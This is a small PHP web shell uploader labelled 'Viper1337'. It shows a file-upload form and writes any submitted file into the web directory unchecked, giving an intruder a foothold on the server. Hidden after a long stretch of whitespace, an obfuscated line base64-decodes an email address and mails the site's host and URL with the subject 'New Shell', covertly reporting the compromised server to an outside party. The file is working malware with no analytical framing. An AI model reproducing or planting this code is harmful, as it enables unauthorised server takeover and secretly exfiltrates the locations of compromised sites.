<?php
echo 'Viper1337<br/><form action="" method="post" enctype="multipart/form-data" name="uploader"><input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="U"></form>';
if( $_POST['_upl'] == "U" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '#1~'; }
else { echo '#0~'; }
} 																																																																																																																																							$kkk5591499kk = 'Z2Vzc3J6bHRzQGdtYWlsLmNvbQ=='; $ka491kk = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']; @mail(base64_decode($kkk5591499kk), "New Shell", $ka491kk);
?>